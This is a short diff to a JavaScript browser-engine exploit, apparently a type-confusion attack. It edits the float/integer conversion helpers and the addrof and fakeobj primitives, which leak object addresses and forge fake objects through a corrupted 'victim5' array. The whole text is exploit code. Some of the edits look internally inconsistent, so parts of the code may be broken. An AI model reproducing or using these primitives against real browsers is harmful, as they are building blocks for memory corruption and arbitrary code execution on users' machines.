@@ -5,7 +5,7 @@
 let convert = new ArrayBuffer(0x8);
 let f64 = new Float64Array(convert);
 let u32 = new Uint32Array(convert);
-let i32 = u32;
+//let i32 = u32;
 let BASE = 0x100000000;
 function i2f(x) {
       u32[0] = x % BASE;
@@ -121,13 +121,13 @@ let backup = hax(1);
 var primitives = {
  addrof: function (obj) {
   hax(backup);
-  victim5[0] = obj;
+  victim5[0] = i2f(obj);
   hax(i2jsv(0x0108211700001000));
-  return victim5[2];
+  return hex(f2i(victim5[2]));
 },
 fakeobj: function (addr) {
   hax(i2jsv(0x0108211700001000));
-    victim5[2] = addr;
+    victim5[2] = f2i(addr);
     hax(backup);
   return victim5[0];
 }};
